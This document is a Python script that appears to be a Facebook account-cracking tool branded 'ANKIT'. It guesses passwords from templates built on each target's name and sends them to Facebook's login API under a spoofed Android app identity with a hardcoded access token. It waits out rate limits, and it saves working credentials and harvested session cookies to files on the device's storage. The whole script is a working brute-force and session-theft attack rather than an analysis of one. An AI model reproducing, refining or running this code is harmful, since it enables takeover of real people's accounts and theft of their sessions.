import requests, sys, time, random, string, uuid

# Global variables
oks = []
cps = []
twf = []
loop = 0
ok = 0
sim_id = "SIM123"  # example sim_id
device = {
    "android_version": "10",
    "model": "SM-A720F",
    "build": "R16NW",
    "fblc": "en_US",
    "fbmf": "samsung",
    "fbbd": "samsung",
    "fbdv": "SM-A720F",
    "fbsv": "10",
    "fbca": "armeabi-v7a",
    "fbdm": "{density=3.0,width=1080,height=1920}"
}

digits = string.digits

pcp = 'y'  # user preference for checkpoint/2FA display

# Modified API function with rate-limit handling
def api3(ids, names, passlist):
    global ok, loop, sim_id, oks, cps, twf
    try:
        sys.stdout.write('\r\r\033[1;37m [ANKIT-M3] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            
            ua = f'Dalvik/2.1.0 (Linux; U; Android {android_version}.0.1; {model} Build/{build}) [FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBDV/{fbdv};FBSV/{fbsv};FBCA/{fbca};FBDM/{fbdm};]'

            data = {
                "format": "json",
                "email": ids,
                "password": pas,
                "generate_session_cookies": "1",
                "credentials_type": "password",
                "locale": "en_US",
                "source": "login",
                "fb_api_req_friendly_name": "authenticate"
            }

            headers = {
                "Authorization": f"OAuth {accessToken}",
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded"
            }

            url = "https://api.facebook.com/method/auth.login"

            try:
                po = requests.post(url, data=data, headers=headers, timeout=15).json()
            except requests.exceptions.RequestException:
                print("\nInternet/Connection Error! Waiting 60s before retry...")
                time.sleep(60)
                continue
            except ValueError:
                print("\nInvalid response received! Skipping...")
                continue

            # Rate limit handling
            if 'error' in po and po['error'].get('error_code') == 613:
                print("\n[!] Rate limit reached (Error 613). Waiting 10 minutes before retry...")
                time.sleep(600)  # 10 minutes
                continue

            twf_msg = 'Login approval are on. Expect an SMS shortly with a code to use for log in'

            if 'session_key' in po:
                print(f'\r\r\033[1;32m [ANKIT-OK] {ids} | {pas}\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in po.get("session_cookies", []))
                open('/sdcard/ANKIT-COKIE.txt', 'a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                open('/sdcard/ANKIT-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break

            elif twf_msg in str(po):
                if 'y' in pcp:
                    print(f'\r\r \033[1;34m[ANKIT-2F] {ids} | {pas}')
                twf.append(ids)
                break

            elif 'www.facebook.com' in str(po.get('error', {}).get('message', '')):
                if 'y' in pcp:
                    print(f'\r\r\x1b[38;5;205m [ANKIT-CP] {ids} | {pas}\033[1;97m')
                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break

            else:
                continue

        loop += 1
        time.sleep(20)  # avoid super-fast requests

    except Exception as e:
        print(f"\nUnexpected error: {e}")
        pass


# ===========================
# Example usage (dummy/testing)
# ===========================
if __name__ == "__main__":
    test_ids = "9763753831"
    test_names = "Nep@L2025"
    test_passlist = ["first123", "last123", "Name123"]
    
    api3(test_ids, test_names, test_passlist)

    print("\nScanning finished!")
    print(f"OK: {oks}")
    print(f"CP: {cps}")
    print(f"TWF: {twf}")
